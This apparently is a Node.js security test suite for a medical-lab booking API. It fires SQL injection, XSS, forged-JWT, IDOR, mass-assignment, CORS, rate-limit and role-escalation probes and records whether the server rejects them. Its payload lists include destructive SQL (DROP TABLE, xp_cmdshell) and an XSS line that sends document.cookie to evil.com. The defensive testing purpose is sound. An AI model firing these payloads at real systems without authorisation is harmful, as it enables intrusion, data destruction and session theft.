const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const BASE_URL = process.env.BASE_URL || 'https://almokhtabar.com';
const API_URL = `${BASE_URL}/api/v1`;
const AUTH_TOKEN = process.env.AUTH_TOKEN || '';
const REPORT_DIR = path.join(__dirname, '../reports/security');
const REPORT_FILE = path.join(REPORT_DIR, `api-security-test-${Date.now()}.json`);

const TEST_CATEGORIES = {
  JWT_MANIPULATION: 'JWT Token Manipulation',
  SQL_INJECTION: 'SQL Injection',
  XSS: 'Cross-Site Scripting',
  IDOR: 'Insecure Direct Object Reference',
  MASS_ASSIGNMENT: 'Mass Assignment',
  RATE_LIMIT: 'Rate Limiting',
  CORS: 'CORS Misconfiguration',
  AUTH_BYPASS: 'Authentication Bypass',
  INPUT_VALIDATION: 'Input Validation',
  GRAPHQL: 'GraphQL Security',
  ROLE_ESCALATION: 'Role Escalation',
};

function makeRequest(method, urlPath, body = null, headers = {}, timeout = 10000) {
  const url = new URL(`${API_URL}${urlPath}`);
  const lib = url.protocol === 'https:' ? https : http;

  return new Promise((resolve) => {
    const payload = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
    const options = {
      hostname: url.hostname,
      port: url.port || (lib === https ? 443 : 80),
      path: url.pathname + url.search,
      method,
      headers: {
        'Content-Type': 'application/json',
        'Accept-Language': 'ar-SA',
        ...headers,
      },
      timeout,
    };

    if (payload) {
      options.headers['Content-Length'] = Buffer.byteLength(payload);
    }

    const start = process.hrtime.bigint();
    const req = lib.request(options, (res) => {
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => {
        const end = process.hrtime.bigint();
        resolve({
          status: res.statusCode,
          duration: Number(end - start) / 1e6,
          body: Buffer.concat(chunks).toString(),
          headers: res.headers,
        });
      });
    });

    req.on('error', (err) => resolve({ status: 0, duration: 0, body: '', headers: {}, error: err.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, duration: timeout, body: '', headers: {}, error: 'timeout' }); });
    if (payload) req.write(payload);
    req.end();
  });
}

function getHeaders(token, extra = {}) {
  return {
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
    ...extra,
  };
}

function status(result) {
  return result.status;
}

function bodyContains(result, str) {
  return result.body.toLowerCase().includes(str.toLowerCase());
}

async function testJwtManipulation() {
  console.log('\n--- JWT Token Manipulation ---');
  const results = [];

  const tests = [
    { name: 'Expired token', token: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwYXRpZW50MSIsImV4cCI6MTUxNjIzOTAyMn0.XX' },
    { name: 'Invalid signature', token: `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwYXRpZW50MSIsInJvbGUiOiJhZG1pbiJ9.invalidsignature` },
    { name: 'Malformed token', token: 'not-a-jwt-token' },
    { name: 'Empty token', token: '' },
    { name: 'Null token', token: 'null' },
    { name: 'Algorithm none', token: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.' },
    { name: 'Token with admin claim', token: Buffer.from(`{"sub":"patient1","role":"admin","iat":${Math.floor(Date.now()/1000)},"exp":${Math.floor(Date.now()/1000)+3600}}`).toString('base64') },
  ];

  for (const test of tests) {
    const res = await makeRequest('GET', '/appointments?limit=5', null, getHeaders(test.token));
    const passed = res.status === 401;
    results.push({ test: test.name, status: res.status, expected: 401, passed, detail: res.body.substring(0, 100) });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | ${test.name}: got ${res.status} (expected 401)`);
  }

  return results;
}

async function testSqlInjection() {
  console.log('\n--- SQL Injection ---');
  const results = [];

  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE \"User\"; --",
    "' UNION SELECT * FROM \"User\" --",
    "1; SELECT pg_sleep(5); --",
    "' OR 1=1 --",
    "admin'--",
    "1' AND 1=1; --",
    "1' AND 1=2; --",
    "' WAITFOR DELAY '0:0:5' --",
    "' OR SLEEP(5) --",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "'; EXEC xp_cmdshell('dir')--",
  ];

  for (const payload of payloads) {
    const res = await makeRequest('GET', `/search/tests?q=${encodeURIComponent(payload)}`, null, getHeaders(AUTH_TOKEN));
    const passed = res.status !== 500 && !bodyContains(res, 'syntax error') && !bodyContains(res, 'SQL');
    results.push({ payload: payload.substring(0, 40), status: res.status, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | payload="${payload.substring(0, 30)}": got ${res.status}`);
  }

  return results;
}

async function testXss() {
  console.log('\n--- Cross-Site Scripting ---');
  const results = [];

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><img src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<!--<script>alert(1)</script>-->',
    '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
  ];

  for (const payload of xssPayloads) {
    const res = await makeRequest('GET', `/search/tests?q=${encodeURIComponent(payload)}`, null, getHeaders(AUTH_TOKEN));
    const passed = !bodyContains(res, '<script>') || res.status >= 400;
    results.push({ payload: payload.substring(0, 40), status: res.status, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | XSS "${payload.substring(0, 30)}": got ${res.status}`);
  }

  // Test XSS in POST body
  const postPayloads = [
    { name: '<script>alert("xss")</script>', email: 'test@test.com' },
    { name: 'Test', email: 'test@test.com', notes: '<img src=x onerror=alert(1)>' },
  ];

  for (const payload of postPayloads) {
    const res = await makeRequest('POST', '/auth/register', payload, getHeaders(AUTH_TOKEN));
    const passed = !bodyContains(res, '<script>') || res.status >= 400;
    results.push({ payload: JSON.stringify(payload).substring(0, 40), status: res.status, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | POST XSS: got ${res.status}`);
  }

  return results;
}

async function testIdor() {
  console.log('\n--- Insecure Direct Object Reference ---');
  const results = [];

  const idorTests = [
    { path: `/results/PAT-OTHER-001`, name: 'Other patient results' },
    { path: `/appointments/APT-OTHER-001/cancel`, name: 'Cancel other appointment', method: 'POST', body: { reason: 'test' } },
    { path: `/payments/wallet/PAT-OTHER-001/balance`, name: 'Other patient wallet' },
    { path: `/admin/users/USER-OTHER-001`, name: 'Admin endpoint accessed as patient' },
    { path: `/results/R-BLD-OTHER-001/download`, name: 'Download other patient result' },
  ];

  for (const test of idorTests) {
    const res = await makeRequest(test.method || 'GET', test.path, test.body || null, getHeaders(AUTH_TOKEN));
    const passed = res.status === 403 || res.status === 404;
    results.push({ ...test, status: res.status, expected: '403/404', passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | ${test.name}: got ${res.status} (expected 403/404)`);
  }

  return results;
}

async function testMassAssignment() {
  console.log('\n--- Mass Assignment ---');
  const results = [];

  const extraFields = [
    { name: 'role injection', body: { email: 'test@test.com', password: 'Test@1234', role: 'admin', isAdmin: true } },
    { name: 'isActive manipulation', body: { email: 'test@test.com', password: 'Test@1234', isActive: false } },
    { name: 'balance manipulation', body: { email: 'test@test.com', password: 'Test@1234', walletBalance: 999999 } },
    { name: 'prototype pollution', body: { email: 'test@test.com', password: 'Test@1234', __proto__: { isAdmin: true } } },
    { name: 'constructor pollution', body: { email: 'test@test.com', password: 'Test@1234', constructor: { prototype: { isAdmin: true } } } },
    { name: 'hidden fields', body: { email: 'test@test.com', password: 'Test@1234', _id: 'admin-id', __v: 0 } },
  ];

  for (const test of extraFields) {
    const res = await makeRequest('POST', '/auth/register', test.body, getHeaders(AUTH_TOKEN));
    const passed = res.status === 400 || res.status === 422 || (res.status === 201 && !bodyContains(res, 'admin'));
    results.push({ name: test.name, status: res.status, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | ${test.name}: got ${res.status}`);
  }

  return results;
}

async function testRateLimit() {
  console.log('\n--- Rate Limiting ---');
  const results = [];
  const requestCount = 120;
  let rateLimited = false;

  for (let i = 0; i < requestCount; i++) {
    const res = await makeRequest('GET', '/search/branches?q=Riyadh', null, getHeaders(AUTH_TOKEN),
      { 'X-Rate-Test': String(i) });
    if (res.status === 429) {
      rateLimited = true;
      results.push({ request: i, status: 429, hasRetryAfter: !!res.headers['retry-after'] });
      console.log(`  Rate limited at request ${i} with status 429. Retry-After: ${res.headers['retry-after'] || 'N/A'}`);
      break;
    }
  }

  if (!rateLimited) {
    results.push({ request: requestCount, status: 'no-429', passed: false });
    console.log(`  FAIL: No rate limit triggered after ${requestCount} requests`);
  }

  return results;
}

async function testCors() {
  console.log('\n--- CORS Misconfiguration ---');
  const results = [];

  const origins = [
    { origin: 'https://evil.com', expected: 'denied' },
    { origin: 'https://almokhtabar.com', expected: 'allowed' },
    { origin: 'https://almokhtabar.com.evil.com', expected: 'denied' },
    { origin: 'null', expected: 'denied' },
    { origin: 'https://attacker.com', expected: 'denied' },
  ];

  for (const test of origins) {
    const res = await makeRequest('GET', '/health', null, {
      ...getHeaders(AUTH_TOKEN),
      'Origin': test.origin,
      'Access-Control-Request-Method': 'GET',
    });
    const acao = res.headers['access-control-allow-origin'] || '';
    const passed = test.expected === 'allowed' ? acao === '*' || acao === test.origin : !acao || acao === 'null';
    results.push({ origin: test.origin, acao, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | Origin: ${test.origin} → ACAO: ${acao || '(none)'}`);
  }

  return results;
}

async function testAuthBypass() {
  console.log('\n--- Authentication Bypass ---');
  const results = [];

  const endpoints = [
    '/appointments?limit=5',
    '/results?limit=5',
    '/payments/invoices?limit=5',
    '/profile',
    '/admin/users?limit=5',
    '/payments/wallet/PAT-001/balance',
  ];

  for (const endpoint of endpoints) {
    const res = await makeRequest('GET', endpoint, null, getHeaders('')); // No auth
    const passed = res.status === 401;
    results.push({ endpoint, status: res.status, expected: 401, passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | ${endpoint}: got ${res.status} (expected 401)`);
  }

  // Test invalid content-type
  const invalidContentRes = await makeRequest('POST', '/auth/login', '{"email":"test@test.com"}', {
    'Content-Type': 'text/plain',
  });
  const contentTypePassed = invalidContentRes.status === 415 || invalidContentRes.status === 400;
  results.push({ endpoint: 'POST /auth/login (text/plain)', status: invalidContentRes.status, expected: '415/400', passed: contentTypePassed });
  console.log(`  ${contentTypePassed ? 'PASS' : 'FAIL'} | Invalid Content-Type: got ${invalidContentRes.status} (expected 415/400)`);

  // Test oversized payload
  const largePayload = { data: 'A'.repeat(10 * 1024 * 1024) }; // 10MB
  const oversizedRes = await makeRequest('POST', '/auth/register', largePayload, getHeaders(AUTH_TOKEN), 15000);
  const oversizedPassed = oversizedRes.status === 413;
  results.push({ endpoint: 'POST /auth/register (10MB)', status: oversizedRes.status, expected: 413, passed: oversizedPassed });
  console.log(`  ${oversizedPassed ? 'PASS' : 'FAIL'} | Oversized payload: got ${oversizedRes.status} (expected 413)`);

  return results;
}

async function testGraphQL() {
  console.log('\n--- GraphQL Security ---');
  const results = [];

  // Test introspection
  const introspectionQuery = JSON.stringify({
    query: `{ __schema { types { name fields { name } } } }`,
  });

  const res = await makeRequest('POST', '/graphql', introspectionQuery, getHeaders(AUTH_TOKEN));
  const hasIntrospection = bodyContains(res, '__schema') || bodyContains(res, '__type');
  results.push({ test: 'Introspection disabled', passed: !hasIntrospection, status: res.status });
  console.log(`  ${!hasIntrospection ? 'PASS' : 'FAIL'} | GraphQL introspection: ${hasIntrospection ? 'ENABLED' : 'DISABLED'}`);

  // Test depth limit
  const deepQuery = JSON.stringify({
    query: `query { user { appointments { results { tests { analytes { name { history { ... } } } } } } } }`,
  });
  const deepRes = await makeRequest('POST', '/graphql', deepQuery, getHeaders(AUTH_TOKEN));
  const depthLimited = deepRes.status === 400 || bodyContains(deepRes, 'depth') || bodyContains(deepRes, 'limit');
  results.push({ test: 'Query depth limit', passed: depthLimited, status: deepRes.status });
  console.log(`  ${depthLimited ? 'PASS' : 'FAIL'} | GraphQL depth limit: ${deepRes.status} ${deepRes.body.substring(0, 100)}`);

  return results;
}

async function testRoleEscalation() {
  console.log('\n--- Role Escalation ---');
  const results = [];

  const adminEndpoints = [
    { method: 'GET', path: '/admin/dashboard/stats' },
    { method: 'GET', path: '/admin/users?limit=10' },
    { method: 'POST', path: '/admin/users', body: { email: 'new@test.com', role: 'doctor' } },
    { method: 'PUT', path: '/admin/settings/global' },
    { method: 'DELETE', path: '/admin/users/USER-001' },
  ];

  for (const ep of adminEndpoints) {
    const res = await makeRequest(ep.method, ep.path, ep.body || null, getHeaders(AUTH_TOKEN));
    const passed = res.status === 403 || res.status === 401;
    results.push({ endpoint: `${ep.method} ${ep.path}`, status: res.status, expected: '403/401', passed });
    console.log(`  ${passed ? 'PASS' : 'FAIL'} | ${ep.method} ${ep.path}: got ${res.status} (expected 403/401)`);
  }

  return results;
}

async function run() {
  console.log('========================================');
  console.log('  API Security Test Suite');
  console.log(`  Target: ${API_URL}`);
  console.log(`  Started: ${new Date().toISOString()}`);
  console.log('========================================\n');

  fs.mkdirSync(REPORT_DIR, { recursive: true });

  const allResults = {};

  allResults.jwtManipulation = await testJwtManipulation();
  allResults.sqlInjection = await testSqlInjection();
  allResults.xss = await testXss();
  allResults.idor = await testIdor();
  allResults.massAssignment = await testMassAssignment();
  allResults.rateLimit = await testRateLimit();
  allResults.cors = await testCors();
  allResults.authBypass = await testAuthBypass();
  allResults.graphql = await testGraphQL();
  allResults.roleEscalation = await testRoleEscalation();

  // Summary
  const allTests = Object.values(allResults).flat();
  const passed = allTests.filter(t => t.passed).length;
  const failed = allTests.filter(t => !t.passed).length;
  const total = allTests.length;

  const report = {
    timestamp: new Date().toISOString(),
    target: API_URL,
    categories: Object.keys(allResults).map(key => ({
      name: TEST_CATEGORIES[key.toUpperCase()] || key,
      key,
      total: allResults[key].length,
      passed: allResults[key].filter(r => r.passed).length,
      failed: allResults[key].filter(r => !r.passed).length,
      results: allResults[key],
    })),
    summary: { total, passed, failed },
    passed: failed === 0,
  };

  fs.writeFileSync(REPORT_FILE, JSON.stringify(report, null, 2));
  console.log(`\nReport: ${REPORT_FILE}`);

  console.log('\n========================================');
  console.log('  Security Test Summary');
  console.log('========================================');
  console.log(`  Total tests: ${total}`);
  console.log(`  Passed: ${passed}`);
  console.log(`  Failed: ${failed}`);
  console.log(`  Pass rate: ${(passed / total * 100).toFixed(1)}%`);
  console.log(`  Overall: ${report.passed ? 'PASS' : 'FAIL'}`);
  console.log('========================================\n');

  if (!report.passed) process.exitCode = 1;
}

run().catch(console.error);
